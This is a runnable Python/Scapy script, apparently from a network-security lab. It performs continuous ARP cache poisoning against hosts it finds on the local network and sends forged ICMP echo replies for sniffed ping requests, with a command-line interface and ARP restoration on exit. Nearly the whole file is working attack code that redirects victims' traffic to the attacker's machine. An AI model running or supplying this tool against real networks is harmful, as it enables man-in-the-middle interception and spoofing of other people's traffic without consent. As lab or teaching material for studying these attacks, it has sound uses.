#!/usr/bin/env python3
"""
FINAL SNIFFING & SPOOFING ATTACK WITH AUTO CLEANUP

Features:
✅ Continuous ARP poisoning (prevents duplicate ICMP replies)
✅ ICMP Echo Reply Spoofing with payload preservation
✅ Automatic ARP table cleanup on Ctrl+C exit
✅ Threaded poisoning loop
✅ Command-line interface & verbose mode
✅ Safe MAC restoration on exit
"""

from scapy.all import *
import argparse
import sys
import time
import os
from threading import Thread, Event

# -------------------------------
# ARGUMENT PARSING
# -------------------------------
parser = argparse.ArgumentParser(description="Sniffing, ARP Poisoning & ICMP Spoofing Tool")
parser.add_argument("-i", "--interface", default="eth0", help="Network interface to use")
parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
args = parser.parse_args()

INTERFACE = args.interface
VERBOSE = args.verbose

# -------------------------------
# GLOBALS
# -------------------------------
POISON_INTERVAL = 2
arp_targets = {}     # (victim_ip, target_ip) -> victim_mac
real_macs = {}       # ip -> real mac for cleanup
stop_event = Event()

# -------------------------------
# GET ATTACKER INFO
# -------------------------------
try:
    ATTACKER_MAC = get_if_hwaddr(INTERFACE)
    ATTACKER_IP = get_if_addr(INTERFACE)

    print(f"[*] Interface: {INTERFACE}")
    print(f"[*] Attacker IP: {ATTACKER_IP}")
    print(f"[*] Attacker MAC: {ATTACKER_MAC}")
    print("[*] Press Ctrl+C to stop & restore ARP tables\n")

except Exception as e:
    print(f"[!] Interface error: {e}")
    sys.exit(1)

# -------------------------------
# PACKET HANDLER
# -------------------------------
def handle_packet(pkt):

    # -------------------------------
    # ARP DISCOVERY (TRACK TARGETS)
    # -------------------------------
    if pkt.haslayer(ARP) and pkt[ARP].op == 1:

        victim_ip = pkt[ARP].psrc
        target_ip = pkt[ARP].pdst
        victim_mac = pkt[Ether].src

        if target_ip == ATTACKER_IP:
            return

        arp_targets[(victim_ip, target_ip)] = victim_mac

        # Save real MAC for cleanup
        if victim_ip not in real_macs:
            real_macs[victim_ip] = victim_mac

        try:
            true_mac = getmacbyip(target_ip)
            if true_mac:
                real_macs[target_ip] = true_mac
        except:
            pass

        if VERBOSE:
            print(f"[ARP] Tracked: {victim_ip} → {target_ip}")

    # -------------------------------
    # ICMP SPOOFING (ECHO REQUEST)
    # -------------------------------
    elif pkt.haslayer(ICMP) and pkt[ICMP].type == 8:

        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        icmp_id = pkt[ICMP].id
        icmp_seq = pkt[ICMP].seq

        payload = b''
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load

        spoof_ip = IP(src=dst_ip, dst=src_ip, ttl=64)
        spoof_icmp = ICMP(type=0, code=0, id=icmp_id, seq=icmp_seq)

        spoofed_packet = spoof_ip / spoof_icmp / payload
        send(spoofed_packet, iface=INTERFACE, verbose=False)

        print(f"[ICMP] Forged Reply: {dst_ip} → {src_ip} (ID={icmp_id}, Seq={icmp_seq})")

# -------------------------------
# CONTINUOUS POISON LOOP
# -------------------------------
def poison_loop():
    while not stop_event.is_set():

        for (victim_ip, target_ip), victim_mac in arp_targets.items():

            ether = Ether(dst=victim_mac, src=ATTACKER_MAC)
            arp_reply = ARP(
                op=2,
                hwsrc=ATTACKER_MAC,
                psrc=target_ip,
                hwdst=victim_mac,
                pdst=victim_ip
            )

            sendp(ether / arp_reply, iface=INTERFACE, verbose=False)

            if VERBOSE:
                print(f"[POISON] {victim_ip} thinks {target_ip} = {ATTACKER_MAC}")

        time.sleep(POISON_INTERVAL)

# -------------------------------
# CLEANUP FUNCTION
# -------------------------------
def restore_arp():

    print("\n[!] Restoring ARP tables...")

    for ip, mac in real_macs.items():

        for target in real_macs.keys():

            if ip == target:
                continue

            ether = Ether(dst=mac)
            arp_restore = ARP(
                op=2,
                hwsrc=real_macs[target],
                psrc=target,
                hwdst=mac,
                pdst=ip
            )

            sendp(ether / arp_restore, iface=INTERFACE, count=3, verbose=False)

            if VERBOSE:
                print(f"[RESTORE] {ip} → {target} restored")

    print("[✓] ARP tables restored successfully.")

# -------------------------------
# MAIN
# -------------------------------
def main():

    poison_thread = Thread(target=poison_loop, daemon=True)
    poison_thread.start()

    print("[*] Sniffing started...")
    print("[*] ARP Poisoning + ICMP Spoofing active\n")

    sniff(
        iface=INTERFACE,
        prn=handle_packet,
        store=0,
        filter="arp or icmp"
    )

# -------------------------------
# PROGRAM ENTRY
# -------------------------------
if __name__ == "__main__":

    if os.geteuid() != 0:
        print("[!] Must be run as root.")
        sys.exit(1)

    try:
        main()

    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")

    finally:
        stop_event.set()
        time.sleep(1)
        restore_arp()
        print("[*] Clean exit complete.")
